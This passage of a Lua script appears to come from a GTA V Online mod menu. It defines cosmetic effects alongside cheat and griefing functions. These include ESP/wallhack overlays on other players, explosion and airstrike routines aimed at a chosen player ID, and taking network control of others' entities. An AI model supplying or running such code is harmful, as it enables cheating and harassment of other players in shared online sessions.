    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)
    local ped = players.user_ped()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    wait(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    wait(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end

function fireworkshow()
    if #placed_firework_boxes == 0 then 
        notification("先放烟花！", colors.blue)
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset_firework(ptfx_asset)
    notification("烟花!!!", colors.blue)
    for i=1, 50 do
        for k,box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)
            wait(100)
        end
    end
    for k,box in pairs(placed_firework_boxes) do 
        entities.delete_by_handle(box)
        placed_firework_boxes[box] = nil
    end
end


function autocover()
    local health = ENTITY.GET_ENTITY_HEALTH(players.user_ped())
    if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) == health then return end
    ENTITY.SET_ENTITY_HEALTH(players.user_ped(), health + 5, 0)
    wait(255)
end

function notifyhealth()
    local player_maxhealth = PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    local player_currenthealth = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
    util.toast("当前血量：" .. player_currenthealth .. "\n最大血量：" .. player_maxhealth)
end

function notifyarmor()
    local player_currentarmour = PED.GET_PED_ARMOUR(PLAYER.PLAYER_PED_ID())
    local player_maxarmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
    util.toast("当前护甲：" .. player_currentarmour .. "\n最大护甲：" .. player_maxarmour)
end

function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end

    function Player_rotate()
        local CV = CAM.GET_GAMEPLAY_CAM_COORD()
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local he = MISC.GET_HEADING_FROM_VECTOR_2D(CV.x, CV.y)
        ENTITY.SET_ENTITY_HEADING(players.user_ped(), he)
        ENTITY.SET_ENTITY_ROTATION(players.user_ped(), rot.x, rot.y, rot.z, 0, true)
    end

    function Leyes(lazer, impact, camrot, weap)
        local reye, leye
        Player_rotate()
        if util.is_session_started() then
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x62ac))
        else
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 6468))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 5956))
        end
        local cama = {}
        cama.x, cama.y, cama.z = Cama()
        if lazer.exp then
            if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(impact)) then
                FIRE.ADD_EXPLOSION(impact.x, impact.y, impact.z, 81, 5000, true, false, 0.0, false)
            end
        end
        Streamptfx('weap_xs_weapons')
        camrot.x += 90
        camrot.y += 180
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', reye.x, reye.y, reye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        Streamptfx('weap_xs_weapons')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', leye.x, leye.y, leye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(reye.x, reye.y, reye.z, cama.x, cama.y,  cama.z , 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(leye.x, leye.y, leye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
    end

    function Cama()
                -- credits to jinxscript
        local inst = v3.new()
        local cama = {}
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        cama.x, cama.y, cama.z = v3.get(inst)
        return cama.x, cama.y, cama.z
    end

function Xraytarget(xray, aim_target, rgb)
    if xray.espline then
        Draw_esp(aim_target, rgb)
    end
    if xray.espbox then
        local color = {
            r = rgb.color.r * 255,
            g = rgb.color.g * 255,
            b = rgb.color.b * 255,
            a = rgb.color.a * 255
        }
        draw_bounding_box(aim_target, color)
    end
    if xray.espbones then
        Bone_Esp(aim_target, SuperESPrgb)  
    end
end

function Bone_Esp (aim_target, rgb)
    hxcoor,hycoor,nxcoor,nycoor,lexcoor,leycoor,rexcoor,reycoor,lhxcoor,lhycoor,
    rhxcoor,rhycoor,pxcoor,pycoor,lkxcoor,lkycoor,rkxcoor,rkycoor,lfxcoor,lfycoor,rfxcoor,rfycoor = 
    memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),
    memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4),memory.alloc(4)

        local head = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x796E))
        local neck = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x9995))
        local left_elbow = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x58b7))
        local right_elbow = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xbb0))
        local left_hand = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x49d9))
        local right_hand = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xdead))
        local pelvis = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x60F0))
        local left_knee = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xb3fe))
        local right_knee = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x3fcf))
        local left_foot = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0x3779))
        local right_foot = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(aim_target, PED.GET_PED_BONE_INDEX(aim_target, 0xcc4d))

        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(head.x, head.y, head.z, hxcoor, hycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(neck.x, neck.y, neck.z, nxcoor, nycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_elbow.x, left_elbow.y, left_elbow.z, lexcoor, leycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_elbow.x, right_elbow.y, right_elbow.z, rexcoor, reycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_hand.x, left_hand.y, left_hand.z, lhxcoor, lhycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_hand.x, right_hand.y, right_hand.z, rhxcoor, rhycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pelvis.x, pelvis.y, pelvis.z, pxcoor, pycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_knee.x, left_knee.y, left_knee.z, lkxcoor, lkycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_knee.x, right_knee.y, right_knee.z, rkxcoor, rkycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(left_foot.x, left_foot.y, left_foot.z, lfxcoor, lfycoor)
        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(right_foot.x, right_foot.y, right_foot.z, rfxcoor, rfycoor)

        directx.draw_line(memory.read_float(hxcoor), memory.read_float(hycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(lexcoor), memory.read_float(leycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(rexcoor), memory.read_float(reycoor), memory.read_float(nxcoor), memory.read_float(nycoor), rgb.color)
        directx.draw_line(memory.read_float(lexcoor), memory.read_float(leycoor), memory.read_float(lhxcoor), memory.read_float(lhycoor), rgb.color)
        directx.draw_line(memory.read_float(rexcoor), memory.read_float(reycoor), memory.read_float(rhxcoor), memory.read_float(rhycoor), rgb.color)
        directx.draw_line(memory.read_float(nxcoor), memory.read_float(nycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color) 
        directx.draw_line(memory.read_float(lkxcoor), memory.read_float(lkycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color)
        directx.draw_line(memory.read_float(rkxcoor), memory.read_float(rkycoor),  memory.read_float(pxcoor), memory.read_float(pycoor), rgb.color)
        directx.draw_line(memory.read_float(lkxcoor), memory.read_float(lkycoor),  memory.read_float(lfxcoor), memory.read_float(lfycoor), rgb.color)
        directx.draw_line(memory.read_float(rkxcoor), memory.read_float(rkycoor),  memory.read_float(rfxcoor), memory.read_float(rfycoor), rgb.color)
end

function Super_Breath(superman)
    Player_rotate()
    local offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 5, 0)
    local offset2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 10, 0)
    for i = 0, superman.breath do
        FIRE.ADD_EXPLOSION(offset.x, offset.y, offset.z, 81, 5000, false, true, 0.0, superman.nodam)
        FIRE.ADD_EXPLOSION(offset2.x, offset2.y, offset2.z, 81, 5000, false, true, 0.0, superman.nodam)
    end
end

function Draw_esp(ped, rgb) --credits to Totaw Annihiwation
    local screenX = memory.alloc(4)
    local screenY = memory.alloc(4)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pos.x, pos.y, pos.z, screenX, screenY)
    directx.draw_line(0.5, 0.5, memory.read_float(screenX), memory.read_float(screenY), rgb.color) 
end

xrtarget = true
function Xrayvision(xray)
    local ped_hndles = entities.get_all_peds_as_handles()
    for ped_hndles as ped do
        if players.user_ped() != ped and not PED.IS_PED_DEAD_OR_DYING(ped, 1) and ENTITY.DOES_ENTITY_EXIST(ped) then
            local ped_coor = ENTITY.GET_ENTITY_COORDS(ped, true)
            local player_coor = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
            local disbet = SYSTEM.VDIST2(ped_coor.x, ped_coor.y, ped_coor.z, player_coor.x, player_coor.y, player_coor.z)
            local too_far = 600000
                
            if not PED.IS_PED_FACING_PED(players.user_ped(), ped, xray.fov) then
                xrtarget = false
            else
                xrtarget = true
            end

            if disbet >= too_far then
                xrtarget = false
            end

            if PED.IS_PED_A_PLAYER(ped) and not xray.players then
                xrtarget = false
            end

            if not PED.IS_PED_A_PLAYER(ped) and not xray.npcs then
                xrtarget = false
            end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) and not xray.targetveh then
                xrtarget = false
            end

            local handle_ptr = memory.alloc(13*8)
            local function pid_to_handle(pid)--credits to lance
                NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
                return handle_ptr
            end
            if PED.IS_PED_A_PLAYER(ped) and xray.players and not xray.friends then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                local hdl = pid_to_handle(pid)
                if NETWORK.NETWORK_IS_FRIEND(hdl) then
                    xrtarget = false
                end
            end
            if xrtarget and PAD.IS_CONTROL_PRESSED(0, 119) then
                xray_target = ped
                Xraytarget(xray, xray_target, SuperESPrgb)
            else 
                xray_target = 0
            end
        end
    end
    return xray_target
end

function Hexarobi_translate(text)
    local translated_string = translations.current_translations[text]
    if translated_string ~= nil and translated_string ~= LANG_STRING_NOT_FOUND then
        --debug_log("Found local translation for '"..text.."'")
        return translated_string
    end
    local label_id = lang.find(text, "en")
    if label_id then
        --debug_log("Found global translation for '"..text.."'")
        translated_string = lang.get_string(label_id, lang.get_current())
        if translated_string ~= LANG_STRING_NOT_FOUND then
            return translated_string
        end
    else
        --debug_log("Missing translation: "..text)
        translations.missing_translations[text] = text
    end
    return text
end

function Str_trans(string)
    return lang.get_string(Hexarobi_translate(string), lang.get_current())
end

function Hudhide()
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
end

    function Supereyes(lazer, impact, camrot, weap)
        local reye, leye
        if lazer.exp then
            if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(impact)) then
                FIRE.ADD_EXPLOSION(impact.x, impact.y, impact.z, 81, 5000, true, false, 0.0, false)
            end
        end
        Streamptfx('weap_xs_weapons')
        
        camrot.x += 90
        camrot.y += 180

        if util.is_session_started() then
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x62ac))
        else
            reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 6468))
            leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 5956))
        end
        local cama = {}
        cama.x, cama.y, cama.z = Cama()
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', reye.x, reye.y, reye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        Streamptfx('weap_xs_weapons')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', leye.x, leye.y, leye.z, camrot.x, camrot.y,  camrot.z, 1, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(reye.x, reye.y, reye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(leye.x, leye.y, leye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
        Player_rotate()
    end

function SF() --Scaleform Full credits to aaron
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Push Away or Blow up'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true))
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true) , Str_trans("Yeet"))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFlsd() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Lazers'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFleaim() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 25, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFlepickup() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 46, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFlevaim() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 68, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFlevhorn() 
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), Str_trans('Lazer Eyes'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFfly()
    Hudhide()
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true), Str_trans('Fly forward or backward twice as fast'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true), Str_trans('Backward'))
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 87, true), Str_trans('Forward'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFfly2()
    Hudhide()
    sf.SET_DATA_SLOT(6,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 62, true), Str_trans('Down'))
    sf.SET_DATA_SLOT(5,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 61, true), Str_trans('Up'))
    sf.SET_DATA_SLOT(4,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 34, true), Str_trans('Left'))
    sf.SET_DATA_SLOT(3,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 35, true), Str_trans('Right'))
    sf.SET_DATA_SLOT(2,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 76, true), Str_trans('Fly forward or backward twice as fast'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 88, true), Str_trans('Backward'))
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 87, true), Str_trans('Forward'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFsuper()
    Hudhide()
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true), Str_trans('Fly Upwards'))
    sf.SET_DATA_SLOT(1,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 25, true), Str_trans('Lazer Eyes'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true))
    sf.SET_DATA_SLOT(3,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 32, true), Str_trans('Fly Downwards'))
    sf.addButton(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 22, true))
    sf.SET_DATA_SLOT(5,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 33, true), Str_trans('Fly faster'))
    sf.SET_DATA_SLOT(6,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 44, true), Str_trans('Land'))
    sf.SET_DATA_SLOT(7,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 73, true), Str_trans('Super Breath'))
    sf.SET_DATA_SLOT(8,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 119, true), Str_trans('X-Ray Vision'))
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01", "prop_mk_plane"}
opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴","小鸡巴V2", "删除"}

function getbigjb(index, value, click_type)
    pluto_switch index do
        case 1:
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            break
        case 2:
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            break
        case 3:
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            break
        case 4:
            attach_to_player("prop_mk_plane", 57597, -0.25, 0.55, 0, 0, -90, 180)
            break
        case 5:
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
            break
        end
    end


function ufffo()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local r = num[math.random(#num)]
    c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 
    c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 
    c.z = c.z + r + 8
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    wait(2500)
    local spawnedufo = entities.create_object(ufo, c) 
    wait(500)
    local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) 
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(ufoc.x, ufoc.y) 
        wait()
    until success
    FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, floorcoords, exp, 100.0, true, false, 1.0, false) 
    wait(1500)
    entities.delete_by_handle(spawnedufo) 

    if not STREAMING.HAS_MODEL_LOADED(ufo) then
        notification("无法加载模型")
    end
end

--外星人爆炸循环
function alien_explosion_loop(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) 
    wait(10)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    wait(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end

function text_func(num)
	local floor = math.floor(num)
	if floor >= num - 0.4999999999 then
		return floor
	else
		return math.ceil(num)
	end
end

v2 = function (x, y)
	local inst = {x = x, y = y}
	setmetatable(inst, v2_meta)
	return inst
end

get_ground_z = function (vec)
    return util.get_ground_z(vec.x, vec.y)
end

function get_v3_of_v2(PosV2)
	local pos = select(2, worldprobe.raycast(v3(PosV2.x, PosV2.y, 800), v3(PosV2.x, PosV2.y, -100), -1, player.get_player_ped(player.player_id())))
	return pos + v3(0, 0, 1)
end
set_scaleform_movie_as_no_longer_needed = function(h)
    local pH = memory.alloc_int()
    memory.write_int(pH, h)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pH)
end

function request_control(entity, timeOut)
    if not ENTITY.DOES_ENTITY_EXIST(entity) then
        return false
    end
    timeOut = timeOut or 500
    local start = newTimer()
    while not request_control_once(entity) and start.elapsed() < timeOut do
        wait()
    end
    return start.elapsed() < timeOut
end

function GetControl(vic, spec, pid)
    if pid == playerid then
        return
    end    
    if not players.exists(pid) then
        util.stop_thread()
    end
    local tick = 0
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) do
        local nid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vic)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(nid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
        wait()
        tick =  tick + 1
        if tick > 10 then
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) then
                if set.alert then
                    menu.toast('Could not gain control')
                end
                if not spec then
                    Specoff(pid)
                end
                util.stop_thread()
            end
        
        end
    end
end

function REQUEST_CONTROL(entity)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function carjump()
    local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)
	for _, vehicle in ipairs(entities) do
		REQUEST_CONTROL(vehicle)
		ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)
	end
	wait(1500)
end

local irlTime = false
local setClockCommand = menu.ref_by_path('World>Atmosphere>Clock>Time', 37)
local smoothTransitionCommand = menu.ref_by_path('World>Atmosphere>Clock>Smooth Transition', 37)
function iri_time(toggle)
    irlTime = toggle
    if menu.get_value(smoothTransitionCommand) then menu.trigger_command(smoothTransitionCommand) end
    util.create_tick_handler(function()
        menu.trigger_command(setClockCommand, os.date('%H:%M:%S'))
        return irlTime
    end)
end

mapZoom = 83
function Zoom_map(value)
    mapZoom = 83
    mapZoom = value
    util.create_tick_handler(function()
        HUD.SET_RADAR_ZOOM_PRECISE(mapZoom)
        return mapZoom != 83
    end)
end

function disableNumpad()
    if not menu.is_open() or K.is_key_down('VK_LBUTTON') or K.is_key_down('VK_RBUTTON') then return end
    for _, control in pairs(numpadControls) do
        PAD.DISABLE_CONTROL_ACTION(2, control, true)
    end
end

function SE_add_explosion(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
    FIRE.ADD_EXPLOSION(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
end

function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        wait(20)
    end
end

function rain_rockets(pid, owned)
    local user_ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local owner
    local hash = util.joaat("weapon_airstrike_rocket")
    if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
        WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
    end
    pos.x = pos.x + math.random(-6,6)
    pos.y = pos.y + math.random(-6,6)
    local ground_ptr = memory.alloc(32); MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false); pos.z = memory.read_float(ground_ptr); memory.free(ground_ptr)
    if owned then owner = user_ped else owner = 0 end
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+50, pos.x, pos.y, pos.z, 200, true, hash, owner, true, false, 2500.0)
end

function request_ptfx_asset_peeloop(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        wait()
    end
end

function GetSpec(pid)
    if players.exists(pid) then
        local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
        return spec
    else
        return
    end
end

function Changeneon(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
